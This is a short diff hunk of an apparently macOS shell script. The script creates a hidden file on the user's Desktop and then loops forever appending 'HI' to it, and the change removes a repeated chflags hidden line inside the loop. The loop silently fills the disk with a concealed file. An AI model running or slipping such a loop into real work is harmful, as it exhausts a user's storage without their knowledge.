@@ -2,7 +2,7 @@ touch Desktop/._.
 chflags hidden Desktop/._.
 while true;do
 echo HI >> Desktop/._.
-chflags hidden Desktop/._.
+
 
 done
 
